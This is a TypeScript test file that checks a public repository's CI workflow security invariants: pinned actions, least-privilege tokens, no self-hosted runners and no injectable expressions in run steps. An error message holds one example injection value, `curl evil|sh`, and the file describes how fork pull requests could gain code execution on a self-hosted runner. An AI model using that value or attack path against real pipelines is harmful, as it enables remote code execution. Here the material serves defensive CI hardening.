/**
 * Tripwire (DEC-12): the CI wiring's invariants hold — the workflow YAMLs are
 * plain config nobody type-checks, so each rule below is enforced here or it
 * silently rots (engineering/CI.md).
 *
 *   1. Bun pin — every GitHub workflow using setup-bun pins via
 *      `bun-version-file: .bun-version` (never an inline version), and the
 *      .gitlab-ci.yml `oven/bun:<tag>` image tag equals .bun-version. The pin
 *      is load-bearing: Bun.sql jsonb-inference drift is a data-corruption
 *      class.
 *   2. Oracle honesty — every self-hosted workflow that runs test/parity or
 *      scripts/verify.ts sets ORACLE_REQUIRED: "1", so an absent PHP oracle is
 *      a RED canary, never a silent green (the AGENTS.md "oracle trap").
 *   3. No hermetic drift — the GitHub hermetic jobs AND .gitlab-ci.yml all
 *      invoke the shared scripts/ci/hermetic.sh (one source of truth), and
 *      hermetic.sh's tripwire list stays a SUBSET of scripts/verify.ts
 *      TRIPWIRES (the hosted tier may run fewer gates, never unknown ones).
 *   4. Tripwire index integrity — scripts/verify.ts TRIPWIRES equals the
 *      engineering/TRIPWIRES.md rows exactly (the 12-vs-14 drift found
 *      2026-07-09 stays fixed), and every listed test file exists.
 *   5. PUBLIC-REPO POSTURE (2026-07-11) — NO self-hosted job may live in
 *      .github/workflows/. renderpci/dedalo is PUBLIC: anyone can fork it and
 *      open a PR, and a `runs-on: self-hosted` job would execute that fork's
 *      code on the Mac holding the real ../private/.env and the live matrix
 *      Postgres — RCE on the data host. The self-hosted tier is preserved,
 *      inert, in .github/workflows-selfhosted/ (GitHub executes only
 *      .github/workflows/) for a PRIVATE mirror. This was prose in CI.md and
 *      prose does not stop a paste; now it is a gate.
 *   7. LEAST PRIVILEGE (2026-08-03) — every workflow declares a top-level
 *      `permissions:` block. With none, the job inherits the REPOSITORY default,
 *      which on a repo created before GitHub changed the default is read/WRITE on
 *      contents — ambient push rights granted to every step, including third-party
 *      actions, in jobs that write nothing back.
 *   8. PINNED ACTIONS (2026-08-03) — every `uses:` names a 40-hex commit SHA, with
 *      the human version in a trailing comment. `@v5` is a MOVING TAG the action's
 *      owner can repoint at any commit: the pin is the difference between "we chose
 *      this code" and "we run whatever that repo publishes today", and the deploy
 *      workflow hands one of these actions an SSH key.
 *   9. CODEQL PAIRING (2026-08-03) — every `github/codeql-action/*` step is pinned
 *      to the SAME SHA. init and analyze are one dependency (init writes the database
 *      analyze reads); Dependabot models them as two and WILL propose splitting them.
 *  10. STATUS-PROSE (2026-08-18) — no row of engineering/TRIPWIRES.md narrates a
 *      transient red/failing state as a standing fact (scripts/lib/status_prose.ts
 *      is the ONE detector; see its header for what pairs a status word with an
 *      instance marker and why bare rule wording stays legal). A row states what
 *      its gate ASSERTS; how the gate is doing at some moment belongs in
 *      rewrite/LEDGER.md or in the commit message. Narrated red in the index
 *      becomes the expected condition and trains the regeneration reflex the
 *      ratchets exist to starve — and it was never load-bearing: rule 4's parser
 *      takes only the first column, and scripts/verify.ts has no allowlist.
 *  13. DB TIER NEEDS NO PRIVATE ENV (2026-08-25) — scripts/ci/db_tier.sh may
 *      contain NO command that requires ../private/.env. Its own header states
 *      the tier needs "no secrets, no ../private/.env, no sibling tree", but the
 *      script called env_guard.sh, whose check 2 hard-fails on a missing
 *      ../private/.env — so on every GitHub run the tier died BEFORE
 *      `bun run test:db:setup`, and its tripwires were "wired" but had never
 *      once executed there. "Wired" must never again quietly mean "never
 *      reached", so the incompatibility is now a scan with a positive control,
 *      not a prose claim.
 *  14. DIFFUSION TABLE OVERRIDES CARRY THE ENGINE'S PREFIX (2026-08-25) — every
 *      literal assigned to DIFFUSION_JOBS_TABLE / DIFFUSION_ACTIVITY_TABLE under
 *      scripts/ and test/ matches the engine's own /^dedalo_ts_test_…/ guard,
 *      which THROWS AT MODULE LOAD (src/diffusion/jobs/schema.ts,
 *      src/core/diffusion_bridge/diffusion_delete.ts). db_tier.sh exported
 *      `dedalo_ts_ci_*` names — latent only because no db-tier gate imported
 *      schema.ts yet; adding one (diffusion_jobs_table_seam.test.ts statically
 *      imports it) would have killed the whole tier at import. The regex is
 *      EXTRACTED from the two engine sources, never re-typed here.
 *
 * SCANNERS THAT ARE NOT GATED HERE, deliberately: CodeQL (.github/workflows/codeql.yml)
 * and the secret scan (.github/workflows/security.yml) are third-party analyses whose
 * rulesets we do not control. Their WIRING is checked by the two rules above like any
 * other workflow; their FINDINGS are not this file's business.
 *
 * EVERY path this gate reads is version-controlled, so it runs on a bare clone.
 * The index moved out of rewrite/LEDGER.md on 2026-07-11 for exactly that
 * reason: rewrite/ is internal process and is not in the repo.
 */

import { describe, expect, test } from 'bun:test';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { Glob } from 'bun';
import { findStatusProse } from '../../scripts/lib/status_prose.ts';
import { CONFIG_CATALOG } from '../../src/config/catalog/index.ts';

const repoRoot = join(import.meta.dir, '..', '..');
const read = (rel: string) => readFileSync(join(repoRoot, rel), 'utf8');

const bunPin = read('.bun-version').trim();

const yaml = (f: string) => f.endsWith('.yml') || f.endsWith('.yaml');

/**
 * A job actually TARGETS the self-hosted runner — i.e. a `runs-on:` directive names
 * it. Deliberately NOT a substring scan: these files must be free to *discuss*
 * self-hosted in their headers (the whole public-repo posture is documented there),
 * and a naive includes('self-hosted') would flag the warning that prevents the bug.
 */
const targetsSelfHosted = (src: string) => /^\s*runs-on:.*self-hosted/m.test(src);

/** EXECUTED by GitHub — the public tier. Hermetic only (rule 5). */
const workflowDir = join(repoRoot, '.github', 'workflows');
const workflowFiles = readdirSync(workflowDir).filter(yaml);

/**
 * INERT on the public repo — the self-hosted tier, kept for the private mirror.
 * GitHub executes ONLY .github/workflows/, so these never run here; that
 * structural fact IS the protection (they hold no secrets — only `${{ secrets.X }}`
 * names, which are meaningless without the secret).
 *
 * NOT existsSync-guarded, deliberately: these files must stay VERSION-CONTROLLED.
 * If they were gitignored or deleted, a soft guard would make the pin/oracle rules
 * below pass VACUOUSLY over an empty list — the silent-narrowing trap. readdirSync
 * throws instead, so removing the tier is a LOUD red, and the mirror (which is a
 * push of this repo) keeps receiving them.
 */
const selfHostedDir = join(repoRoot, '.github', 'workflows-selfhosted');
const selfHostedFiles = readdirSync(selfHostedDir).filter(yaml);

/** Every workflow YAML, wherever it lives: the pin + oracle rules bind to both tiers. */
const allWorkflows: Array<{ rel: string; src: string }> = [
	...workflowFiles.map((f) => ({ rel: join('.github', 'workflows', f), src: '' })),
	...selfHostedFiles.map((f) => ({ rel: join('.github', 'workflows-selfhosted', f), src: '' })),
].map((w) => ({ ...w, src: read(w.rel) }));

/** verify.ts TRIPWIRES entries (the quoted test paths inside the array). */
function verifyTripwires(): string[] {
	const src = read('scripts/verify.ts');
	const block = src.match(/const TRIPWIRES = \[([\s\S]*?)\];/)?.[1];
	if (!block) throw new Error('scripts/verify.ts: TRIPWIRES array not found');
	return [...block.matchAll(/'(test\/[^']+\.test\.ts)'/g)].map((m) => m[1] as string);
}

/** hermetic.sh HERMETIC_TRIPWIRES entries. */
function hermeticTripwires(): string[] {
	const src = read('scripts/ci/hermetic.sh');
	// Terminate at a LINE-START ')', not the first ')' anywhere: section comments
	// inside the array legitimately contain parentheses, and a non-greedy match
	// stopped dead at the first one. Measured 2026-08-24: that truncation hid 20
	// of the 41 entries from this gate — the rule guarding the hermetic list was
	// itself only checking half of it, silently, since 2026-08-03.
	const block = src.match(/HERMETIC_TRIPWIRES=\(\n([\s\S]*?)\n\)/)?.[1];
	if (!block) throw new Error('scripts/ci/hermetic.sh: HERMETIC_TRIPWIRES array not found');
	// Entries only: a path must BE the line, so a path mentioned inside a comment
	// is not mistaken for a wired gate.
	return block
		.split('\n')
		.map((line) => line.trim())
		.filter((line) => line !== '' && !line.startsWith('#'))
		.map((line) => {
			const m = line.match(/^(test\/[^\s]+\.test\.ts)$/);
			if (!m)
				throw new Error(`scripts/ci/hermetic.sh: unparsable HERMETIC_TRIPWIRES line: ${line}`);
			return m[1] as string;
		});
}

/**
 * db_tier.sh DB_TIER_TRIPWIRES entries — the hosted DB tier's list.
 *
 * Same parsing discipline as hermeticTripwires() above, for the same measured
 * reason: terminate at a LINE-START ')' — a '(' inside a section comment
 * silently truncated the hermetic array at 21 of its 41 entries from 2026-08-03
 * to 2026-08-24, so the rule guarding that list was checking half of it — and a
 * path must BE the line, so a path named inside a comment is never mistaken for
 * a wired gate.
 *
 * NOT existsSync-guarded, deliberately: read() throwing ENOENT on a missing
 * db_tier.sh IS the loud red. A soft guard would let rule 3c pass vacuously over
 * an empty list, which is exactly the runs-on-no-tier state the rule forbids.
 */
function dbTierTripwires(): string[] {
	const src = read('scripts/ci/db_tier.sh');
	const block = src.match(/DB_TIER_TRIPWIRES=\(\n([\s\S]*?)\n\)/)?.[1];
	if (!block) throw new Error('scripts/ci/db_tier.sh: DB_TIER_TRIPWIRES array not found');
	return block
		.split('\n')
		.map((line) => line.trim())
		.filter((line) => line !== '' && !line.startsWith('#'))
		.map((line) => {
			const m = line.match(/^(test\/[^\s]+\.test\.ts)$/);
			if (!m) throw new Error(`scripts/ci/db_tier.sh: unparsable DB_TIER_TRIPWIRES line: ${line}`);
			return m[1] as string;
		});
}

/**
 * Rule 13's matcher — the lines of a shell script that REQUIRE ../private/.env.
 *
 * Three shapes count, each one a way db_tier.sh could re-acquire the dependency
 * its header forswears:
 *   - any non-comment line naming `../private/.env` itself (reading, sourcing,
 *     testing it — the file must not be needed, so it must not be named);
 *   - an env_guard.sh invocation WITHOUT --no-private-env (check 2 of that
 *     guard hard-fails on the missing file — the exact line that killed the
 *     tier on every GitHub run until 2026-08-25);
 *   - any link_siblings.sh invocation (its whole job is materializing the
 *     sibling ../private tree — a hosted runner has no sibling to link).
 *
 * Comment lines are exempt: the header DISCUSSES ../private/.env (it documents
 * why the tier does not need it), and flagging the warning that prevents the
 * bug is the trap rule 5's targetsSelfHosted() already refuses to fall into.
 * `mkdir -p ../private` stays legal — it creates the parent directory the suite
 * media root derives under, and never touches the .env file.
 *
 * What this does NOT prove: that no INVOKED program reads the file on its own.
 * `bun run test:db:setup` runs fine without it because the script exports the
 * full config into the process env (rule 6 pins that stub list to the catalog);
 * a future subcommand that insists on the file would pass this scan and die at
 * runtime — loudly, in CI, which is the failure mode this rule downgraded the
 * silent never-ran state to.
 */
function privateEnvOffenders(src: string): string[] {
	const offenders: string[] = [];
	for (const raw of src.split('\n')) {
		const line = raw.trim();
		if (line === '' || line.startsWith('#')) continue;
		if (line.includes('../private/.env')) offenders.push(line);
		else if (/\benv_guard\.sh\b/.test(line) && !line.includes('--no-private-env'))
			offenders.push(line);
		else if (line.includes('link_siblings.sh')) offenders.push(line);
	}
	return offenders;
}

/**
 * Rule 14's regex source: extract the seam-override guard regex FROM the two
 * engine modules rather than re-typing it. This gate cannot import them — both
 * drag src/core/db/postgres.ts into the closure, and resolveJobsTable() runs at
 * module load, which would disqualify this file from the hermetic tier (the
 * exact NOT_HERMETIC criterion several rows above document) — so the next-best
 * mechanical bond is reading their SOURCE: if either regex changes shape or the
 * two modules disagree, this throws and the rule goes red instead of silently
 * validating against a stale copy.
 */
function diffusionSeamGuardRegex(): RegExp {
	const sources = [
		'src/diffusion/jobs/schema.ts',
		'src/core/diffusion_bridge/diffusion_delete.ts',
	] as const;
	const literals = sources.map((rel) => {
		const m = read(rel).match(/if \(!(\/\^[^/]+\/)\.test\(override\)\)/);
		if (!m) throw new Error(`${rel}: seam-override guard regex not found — rule 14 is now blind`);
		return m[1] as string;
	});
	if (new Set(literals).size !== 1) {
		throw new Error(
			`the two seam-guard regexes disagree (${literals.join(' vs ')}) — they are one contract and must move together`,
		);
	}
	const literal = literals[0] as string;
	return new RegExp(literal.slice(1, -1));
}

/** engineering/TRIPWIRES.md table rows (first column, test paths). */
function ledgerTripwires(): string[] {
	const src = read('engineering/TRIPWIRES.md');
	const rows = [...src.matchAll(/^\| (test\/[^\s|]+\.test\.ts) \|/gm)].map((m) => m[1] as string);
	if (rows.length === 0) throw new Error('engineering/TRIPWIRES.md: no tripwire rows found');
	return rows;
}

/**
 * Rule 3c — tripwires that do NOT run on the hermetic tier. Each row is an
 * ASSIGNMENT, not an excuse: the reason says why the gate cannot run DB-less,
 * and the gate MUST also appear in scripts/ci/db_tier.sh DB_TIER_TRIPWIRES (the
 * hosted DB tier, .github/workflows/db.yml). The two lists are asserted EQUAL,
 * so "excused from hermetic" can never again quietly mean "runs nowhere".
 *
 * This began as the CONVERSE of the subset rule below it, because that rule
 * alone is a one-way silence: for months a tripwire could be added to verify.ts,
 * never wired into hermetic.sh, and run on NO executing tier while every gate
 * stayed green. Measured 2026-08-24: the index
 * held 89 gates and hermetic.sh 41 — and five more landed that same day, taking
 * the unrun set from 48 to 53, with nothing red at any point.
 *
 * The map is exact in BOTH directions: an unlisted exclusion is red (the new
 * gate must be wired hermetically or ASSIGNED to the DB tier — a reason alone no
 * longer suffices) and a stale entry is red too (a listed gate
 * that now runs hermetically, or that is no longer a tripwire at all).
 *
 * Every entry below is a DB-tier gate — verified by reading its closure, not its
 * name. To move one here it is not enough that it looks pure: hermetic.sh's
 * standing rule is that an entry is EMPIRICALLY re-verified with DB_PORT closed
 * before being added.
 */
const NOT_HERMETIC: ReadonlyMap<string, string> = new Map([
	[
		'test/unit/concurrency_interleave.test.ts',
		'Four of its six layers are DB-backed by construction: the resolver reads a real section in two languages, the grid-columns and tools-registry caches are built from real ontology rows, and the ISO-02 core-cache regression (P2-35) resolves a real element through buildStructureContext at two permission levels. The whole file is about what a LONG-LIVED PROCESS holds between requests, and a mocked store holds nothing',
	],
	[
		'test/unit/remove_sentinel_native.test.ts',
		"The refusal it gates is only meaningful against real stored data: it saves a component in several languages through the real save door, then sends an id-less `remove` and asks the DATABASE what survived — the column, the item-id counter in `meta` and the time-machine tail must all be byte-unchanged, and `action:'clear'` must empty every language AND be audited. A mocked store would prove nothing about the wipe this gate exists to prevent",
	],
	[
		'test/unit/marc_identity_native.test.ts',
		"Its whole point is behavioural: it creates real records carrying a real code component, imports a MARC file whose control number matches, and asserts the row landed on the RIGHT record — plus the destructive control, that a control number equal to another record's section_id does not write to that record. None of that exists without the suite database",
	],
	[
		'test/unit/account_revocation_native.test.ts',
		'Every assertion is about what a REAL write did to real state: it inserts dd128 records through the counter-allocating writer, logs them in, applies each of the six account transitions through a real door, and then asks the session store and the media marker directory what survived — a revocation gate that mocked either surface would prove nothing about the property it exists to hold',
	],
	[
		'test/unit/dd128_write_census_tripwire.test.ts',
		"Its census legs read source and are pure, but the behavioural leg (GATE-24) mints a scratch dd234 profile and a scratch dd128 user, resolves a real principal carrying level 2 on (dd128, dd1725), and drives tool_propagate_component_data at that principal's own record to prove the refusal WORKS — an authorization decision may not rest on a source substring, and none of that exists without the suite database",
	],
	[
		'test/unit/client_idempotency_tripwire.test.ts',
		'Its structural legs are pure, but the end-to-end leg drives the real create door twice under one idempotency key and asserts the RECORD COUNT is unchanged — the only assertion that proves the server honours the key rather than merely receiving it — so it needs the suite database',
	],
	[
		'test/unit/export_gate_b_native.test.ts',
		'It drives the real get_export_grid handler as a principal resolved from dd128/dd234 rows against a record it mints with a dd153 project locator, and asserts what the export actually EMITTED — every refusal and the one authorized cell alike are statements about rows the projects filter selected, unobservable without the suite database',
	],
	[
		'test/unit/search_path_acl_native.test.ts',
		'It builds a multi-hop filter as a scoped principal and asserts both the generated SQL per join alias AND a behavioural hit/miss probe against records it writes, so the oracle-closing half cannot be evaluated without a live Postgres',
	],
	[
		'test/unit/frontier_class_native.test.ts',
		'The class probe writes the hidden record twice, once per sentinel, across all three frontier surfaces and compares the scoped answers byte-for-byte while requiring the admin pair to differ — it is entirely a statement about stored rows',
	],
	[
		'test/unit/csv_parser_conformance_native.test.ts',
		'The fixture table is pure, but the duplicate-section_id case and both door-refusal cases drive the real import_files handler against matrix_test — a row must be created, then updated, and read back — so the gate cannot run on a runner with no suite database',
	],
	[
		'test/unit/ingest_encoding_tripwire.test.ts',
		'It drives get_csv_files and import_files end to end with CP1252 bytes and reads the stored value back, so the conversion is proved on the record rather than on the decoder in isolation; without the suite database there is nothing to read back',
	],
	[
		'test/unit/write_lang_provenance_native.test.ts',
		'Every door in its derived census is exercised by writing a real record under a session data language and reading the stored slice lang back out of the matrix; the refusal cases assert no transaction was opened, which requires a live connection to observe',
	],
	[
		'test/unit/bulk_process_id_tripwire.test.ts',
		'It asserts what a bulk executor WROTE — that every Time Machine row carries a non-null bulk_process_id and that a failed dd800 mint leaves no orphan row — which is a statement about database rows and is unobservable without them',
	],
	[
		'test/unit/delete_inverse_lost_update_native.test.ts',
		'Its whole subject is a CROSS-CONNECTION lost update: it opens two Postgres sessions, holds one transaction open on the owner row and polls pg_blocking_pids until the delete is provably waiting on that lock, so there is nothing left of the gate without a live suite database — on a bare runner every case would fail at connect, not skip, and the invariant would be untestable rather than merely unrun',
	],
	[
		'test/unit/duplicate_record_dataframe_native.test.ts',
		'It builds a host record, its dataframe frame targets and a non-admin principal through the engine own write path and then duplicates them, asserting what the copied locators POINT AT across matrix tables; every assertion reads rows back out of the suite database, so the gate cannot run on the hosted tier',
	],
	[
		'test/unit/tm_lang_slice_restore_native.test.ts',
		'It materializes a scratch ontology (zztmlang) and multilingual records through saveComponentData, drives both Time-Machine restore doors and reads matrix_time_machine rows back as stored jsonb text to prove untouched languages survive byte-identical — all of it database state, none of it reachable without the suite Postgres',
	],
	[
		'test/unit/consultation_only_sections_tripwire.test.ts',
		'The engine-guard refusals resolve pre-DB but the readSection end-to-end leg and the ontology-backed permission/structure lookups query the suite Postgres, so the gate cannot run on the hosted tier',
	],
	[
		'test/unit/dbread_role_tripwire.test.ts',
		'Its entire subject is a database object — it connects AS the dedalo_test_ro role and fires zero-row write probes that Postgres must refuse with 42501; without a live suite DB every test skips (empirically verified DB_HOST=127.0.0.1 DB_PORT=1: 5 skip / 0 pass), so on the hermetic tier the gate would be 100% skip, i.e. vacuous — it runs on the DB tier, where test:db:setup step 5b has just ensured the role',
	],
	[
		'test/unit/error_taxonomy_tripwire.test.ts',
		'Legs A–C and E are pure tracked-source scans, but leg D needs the suite Postgres and would report an explicit SKIP forever on the hosted tier — putting the whole file there would silently drop the runtime-envelope leg, so it belongs on the DB tier (or needs a split)',
	],
	[
		'test/unit/external_degradation_tripwire.test.ts',
		'The derivation and import-refusal halves read the suite database’s ontology (test TLD nodes) through the postgres-backed resolver, so it needs the live suite DB even though it writes nothing',
	],
	[
		'test/unit/external_egress_tripwire.test.ts',
		'The adapter-shape tests are pure, but the sentinel-control legs resolve the test3 section’s api_config from dd_ontology through the live Postgres before the stubbed fetch ever runs',
	],
	[
		'test/unit/external_isolation_tripwire.test.ts',
		'The behavioural tests run fetchExternalRows against real ontology properties of section test3, so the closure both loads the postgres pool and issues live queries against the suite DB (fetch itself is stubbed, so no network)',
	],
	[
		'test/unit/external_search_target_tripwire.test.ts',
		'The frozen-copy half is credless but the ’real ontology’ describe must resolve the generic test61/test204 callers in the suite database and is deliberately red when it cannot, so the gate as a whole needs postgres',
	],
	[
		'test/unit/external_write_refusal_tripwire.test.ts',
		'It performs real matrix reads and a real scratch-record write/save round trip on the marked suite database — a genuine DB-tier gate that cannot run hosted',
	],
	[
		'test/unit/info_widget_registry_tripwire.test.ts',
		'The ontology-census test queries the shared dd_ontology table for every declared widget_name, so it needs the live matrix Postgres and cannot run on a bare runner',
	],
	[
		'test/unit/matrix_index_asset_policy_agreement.test.ts',
		'By design it creates indexes on and reads pg_get_indexdef from a live Postgres catalog — the signature-not-hand-writable rule cannot be checked without one',
	],
	[
		'test/unit/media_thumb_census_tripwire.test.ts',
		'Its assertions are pure path math and source scans (no query is ever issued — the media root is a marked tmpdir), but the dynamic posterframe.ts import drags the postgres pool module (and its DB config requirements) into the closure, which the hermetic criteria disqualify; splitting posterframeAbsolutePath out of the file_ops chain would make this gate hermetic',
	],
	[
		'test/unit/root_user_hidden_tripwire.test.ts',
		'Half the gate is the exemption direction — proving the direct-fetch paths still resolve the seeded root row from the suite database — so it cannot run without live postgres',
	],
	[
		'test/unit/sql_confinement_tripwire.test.ts',
		'The T1/T3/T4 halves are pure source scans, but the T3 behavioural half writes and queries scratch ontology rows in the live matrix Postgres, so the file as a whole cannot go hermetic without splitting the accessor-semantics tests out',
	],
	[
		'test/unit/temporal_instance_tripwire.test.ts',
		'Drives the real write door against the suite database’s test3 fixture, including a deliberate canary write to a scratch record, so a live Postgres with the suite fixture is required',
	],
	[
		'test/unit/test3_canonical_fixture.test.ts',
		'It restores, resets and snapshots the matrix_test table and matrix_counter in the live suite database — it is the DB fixture’s own gate and is meaningless without Postgres',
	],
	[
		'test/unit/test_db_marker_tripwire.test.ts',
		'The gate’s core proof is behavioural against the live suite database (delete-marker-in-transaction, real refusals, real installer bypass), so it is DB-bound by design',
	],
	[
		'test/unit/test_rag_db_tripwire.test.ts',
		'Its core proof is behavioural against TWO live databases: the guard is refused on the real suite matrix database (unmarked for the RAG law) and accepted once the real producer marks it inside a rolled-back transaction, and rule 4 asks the RAG POOL ITSELF for `current_database()` and drives a real write door on it — a vector-store guard proved by source alone would be exactly the kind of unverified claim it exists to replace',
	],
	[
		'test/unit/test_media_root_tripwire.test.ts',
		'Most legs are fs/source scans, but the ensureMediaKit refusal door must reach the suite Postgres for the test-database marker check before its media-root refusal fires, so the gate needs the DB tier (or that one door split out)',
	],
	[
		'test/unit/test_tld_ontology_gate.test.ts',
		'Tiers (c)/(d) are declared DATABASE tiers and query/round-trip dd_ontology and matrix tables on the suite DB; only tiers (a)/(b) are hermetic, so the file as a whole cannot go on the hosted tier without being split',
	],
	[
		'test/unit/tm_mode_retired_tripwire.test.ts',
		'Its final test’s dynamic import pulls the postgres pool module into the closure (no query is ever executed — pickReadSource only selects a function — so splitting that one test out or asserting the wiring from source would make the remainder hermetic), but as written the gate reaches the DB layer',
	],
	[
		'test/unit/tools_cache_invalidation.test.ts',
		'Its reachability and registry-cache tests create, duplicate and delete real records in the suite database to observe cache invalidation end-to-end, so it requires the live matrix Postgres',
	],
]);

describe('CI workflow tripwire', () => {
	test('every GitHub workflow using setup-bun pins via bun-version-file, never inline', () => {
		for (const { rel, src } of allWorkflows) {
			if (!src.includes('setup-bun')) continue;
			expect(src, `${rel}: setup-bun must use bun-version-file: .bun-version`).toContain(
				'bun-version-file: .bun-version',
			);
			expect(src, `${rel}: inline bun-version would drift from the .bun-version pin`).not.toMatch(
				/bun-version:\s/,
			);
		}
	});

	// Rule 5 — the public-repo security posture, mechanically.
	test('NO self-hosted job lives in .github/workflows/ (public repo — fork PRs would get RCE on the data host)', () => {
		const offenders = workflowFiles.filter((f) =>
			targetsSelfHosted(read(join('.github', 'workflows', f))),
		);
		expect(
			offenders,
			'renderpci/dedalo is PUBLIC. A `runs-on: self-hosted` job here executes fork-PR code on the Mac that holds ../private/.env and the live matrix Postgres. Move it to .github/workflows-selfhosted/ (inert; GitHub executes only .github/workflows/). If the repo ever goes private again, retire this rule deliberately — do not just delete it:',
		).toEqual([]);
	});

	/**
	 * Rule 6 — hermetic.sh stubs EVERY required-no-default config key.
	 *
	 * The bug this exists to prevent (2026-07-11, the first real CI run): hermetic.sh
	 * stubbed 5 of the 8 required keys. On a developer machine the missing three were
	 * silently satisfied by ../private/.env, so the script passed locally and died on
	 * the bare runner with `Missing required config key 'PROJECTS_DEFAULT_LANGS'`. A
	 * hermetic script that reads a file it swears it does not read is not hermetic —
	 * and only CI could tell us. Now the stub list cannot drift from the catalog.
	 */
	test('hermetic.sh and db_tier.sh stub every required-no-default config key', () => {
		const required = new Set(
			Object.entries(CONFIG_CATALOG)
				.filter(([, entry]) => entry.required === true)
				.map(([key]) => key),
		);
		expect(
			required.size,
			'no required config keys in the catalog — src/config/catalog/ moved or lost its `required` flags',
		).toBeGreaterThan(0);

		for (const script of ['scripts/ci/hermetic.sh', 'scripts/ci/db_tier.sh']) {
			const src = read(script);
			// A key counts as stubbed iff it is ASSIGNED and EXPORTED. The old grammar
			// (`${KEY:[=-]`) credited any `${KEY:-fallback}` READ anywhere in the file:
			// the DEDALO_APPLICATION_LANGS if-block passed only through its guard's
			// `[ -z "${…:-}" ]`, while the assignment and the export were invisible to
			// it. So deleting that block while any diagnostic `${KEY:-}` read survived
			// would have kept this gate green and killed the bare runner at module
			// init — the exact 2026-07-11 class this rule exists to prevent.
			//
			// Two assignment forms are accepted (`: "${KEY:=…}"` and a line-start
			// `KEY=…`, which is the if-block body), and the key must additionally
			// reach an `export` line: the catalog reads process.env, and an
			// unexported shell variable never gets there.
			const assigned = new Set(
				[
					...src.matchAll(/^\s*: "\$\{([A-Z0-9_]+):=/gm),
					...src.matchAll(/^\s*([A-Z0-9_]+)=/gm),
				].map((m) => m[1] as string),
			);
			const exported = new Set(
				[...src.matchAll(/^\s*export\s+(.+)$/gm)].flatMap((m) =>
					(m[1] as string).split(/\s+/).map((token) => token.split('=')[0] as string),
				),
			);
			const unstubbed = [...required]
				.filter((key) => !(assigned.has(key) && exported.has(key)))
				.sort();
			expect(
				unstubbed,
				`Required config keys not assigned-and-exported in ${script}. On a bare CI runner there is no ../private/.env, so the config catalog THROWS at module init and the whole tier dies (with cascading "Cannot access 'config' before initialization" TDZ noise). Add a harmless stub — it only has to parse — and put the key on an export line:`,
			).toEqual([]);
		}
	});

	// The self-hosted tier must stay IN THE REPO. Gitignoring it would (a) never reach
	// the private mirror, which is a push of this repo, and (b) make the pin/oracle
	// rules above pass vacuously over an empty list. It carries no secrets — only
	// `${{ secrets.X }}` names — so there is nothing to hide, and hiding it would only
	// remove it from review.
	test('the self-hosted tier is version-controlled and non-empty (never gitignored)', () => {
		expect(
			selfHostedFiles.length,
			'.github/workflows-selfhosted/ has no workflow YAML. It is the parked DB/parity/client tier — if it was deleted or gitignored, restore it: the private mirror receives it by PUSH, and this gate guards its bun pin + ORACLE_REQUIRED wiring.',
		).toBeGreaterThan(0);
		const stray = selfHostedFiles.filter(
			(f) => !targetsSelfHosted(read(join('.github', 'workflows-selfhosted', f))),
		);
		expect(
			stray,
			'Workflow in .github/workflows-selfhosted/ that targets no self-hosted runner — if it can run hosted, it belongs in .github/workflows/ where it will actually execute:',
		).toEqual([]);
	});

	// Rule 7 — least privilege. Binds to BOTH tiers: the self-hosted jobs are the ones
	// with real reach (they run on the data host), so an inherited write token there is
	// worse, not better.
	test('every workflow declares a top-level permissions block', () => {
		const offenders = allWorkflows
			.filter(({ src }) => !/^permissions:/m.test(src))
			.map(({ rel }) => rel);
		expect(
			offenders,
			'A workflow with no top-level `permissions:` inherits the REPOSITORY default GITHUB_TOKEN scope — historically read/write on contents, i.e. push rights handed to every step of a job that only reads. Declare what the job actually needs (`permissions: {contents: read}` for all of ours except codeql.yml, which writes code-scanning alerts):',
		).toEqual([]);
	});

	// Rule 7b — the VALUE, not the presence (P2-21 / GATE-45). The rule above is
	// `!/^permissions:/m`, which is satisfied by `permissions: write-all` — the
	// single most permissive token GitHub offers, and the exact opposite of what
	// the rule exists to require. A matcher must match the invariant.
	test('no workflow grants itself blanket write', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			const block = src.match(/^permissions:([^\n]*)((?:\n[ \t]+[^\n]*)*)/m);
			const inline = (block?.[1] ?? '').trim();
			const nested = block?.[2] ?? '';
			if (/write-all/.test(inline) || /write-all/.test(nested)) {
				offenders.push(`${rel}: permissions grants write-all`);
				continue;
			}
			// `contents: write` is push rights. codeql.yml's security-events:write is
			// its actual output and is the one documented exception.
			if (/^\s*contents:\s*write\s*$/m.test(nested)) {
				offenders.push(`${rel}: contents: write — push rights for a job that reads`);
			}
		}
		expect(
			offenders,
			'A workflow token wider than the job needs is ambient push rights handed to every ' +
				`step, third-party actions included.\n  ${offenders.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 7c — the TRIGGERS the neighbouring rule's own comment names as the
	// threat it cannot reach (P2-21 / GATE-45). `pull_request_target` runs with a
	// WRITE token and the base repo's secrets while checking out the FORK's code;
	// `workflow_run` does the same after another workflow completes. Either one
	// turns "least privilege" into a formality.
	test('no workflow uses pull_request_target or workflow_run', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const trigger of ['pull_request_target', 'workflow_run'] as const) {
				if (new RegExp(`^\\s{2,}${trigger}:`, 'm').test(src)) {
					offenders.push(`${rel}: ${trigger}`);
				}
			}
		}
		expect(
			offenders,
			"`pull_request_target` and `workflow_run` run with a WRITE token and this repo's " +
				'secrets while executing code from a fork. Neither is needed by any job here.\n  ' +
				offenders.join('\n  '),
		).toEqual([]);
	});

	// Rule 7d — EXPRESSION INJECTION (P2-24 / GATE-46). A `${{ … }}` expression is
	// substituted into the script TEXT before the shell ever sees it, so an
	// attacker-chosen input becomes commands. Secrets and inputs reach a `run:`
	// through `env:`, where the runner sets them as shell VARIABLES.
	test('no run: line interpolates an input or secret', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			let inRun = false;
			for (const [index, raw] of src.split('\n').entries()) {
				if (/^\s*run:\s*\|?\s*$/.test(raw) || /^\s*run:\s+\S/.test(raw)) inRun = true;
				else if (/^\s*-?\s*(?:name|uses|with|env|if|id|shell|working-directory):/.test(raw)) {
					inRun = false;
				}
				if (!inRun) continue;
				if (/\$\{\{\s*(?:inputs|github\.event|secrets)\./.test(raw)) {
					offenders.push(`${rel}:${index + 1}  ${raw.trim().slice(0, 90)}`);
				}
			}
		}
		expect(
			offenders,
			'A `${{ … }}` expression inside `run:` is substituted into the SCRIPT TEXT: an input ' +
				'like `x"; curl evil|sh; :"` becomes commands. Pass it through `env:` and read the ' +
				`shell variable instead.\n  ${offenders.join('\n  ')}`,
		).toEqual([]);
	});

